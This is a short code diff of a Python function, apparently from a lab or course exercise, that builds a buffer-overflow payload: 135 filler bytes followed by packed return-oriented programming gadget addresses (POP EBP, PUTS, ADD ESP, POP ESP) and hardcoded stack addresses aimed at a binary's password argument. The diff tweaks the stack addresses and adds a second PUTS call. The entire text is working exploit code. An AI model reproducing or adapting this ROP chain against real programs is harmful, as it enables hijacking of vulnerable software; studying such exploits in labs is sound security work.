@@ -38,15 +38,17 @@ def get_arg() -> bytes:
     Returns:
          The bytes of the password argument.
     """
-    search = GadgetSearch(LIBC_DUMP_PATH)
+    search = GadgetSearch(LIBC_DUMP_PATH) 
+    
     msg = ('A'*135).encode('utf-8')
     msg += struct.pack('<I', search.find('POP EBP'))
     msg += struct.pack('<I', addresses.PUTS)
     msg += struct.pack('<I', search.find(''))
+    msg += struct.pack('<I', addresses.PUTS)
     msg += struct.pack('<I', search.find('ADD ESP, 4'))
-    msg += struct.pack('<I', 0xbfffdffc)
+    msg += struct.pack('<I', 0xbfffdfec)
     msg += struct.pack('<I', search.find('POP ESP'))
-    msg += struct.pack('<I', 0xbfffdfe8)
+    msg += struct.pack('<I', 0xbfffdfd8)
     msg += get_string(205817893).encode('utf-8')
     
     return msg
